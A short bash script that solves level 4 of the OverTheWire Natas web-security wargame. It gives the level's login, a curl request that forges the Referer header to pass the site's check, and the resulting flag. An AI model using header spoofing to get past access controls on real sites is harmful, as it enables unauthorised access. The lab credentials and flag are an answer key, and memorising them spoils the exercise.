#!/bin/bash

 Username="natas4"
 Password="QryZXc2e0zahULdHrtHxzyYkj59kUxLQ"

# URL:
 curl -s -u $Username:$Password http://natas4.natas.labs.overthewire.org

# Code:
# Add a header with -e parameter o the referer field
# curl -s -e "http://natas5.natas.labs.overthewire.org/" -u $Username:$Password http://natas4.natas.labs.overthewire.org

# Flag:
# 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
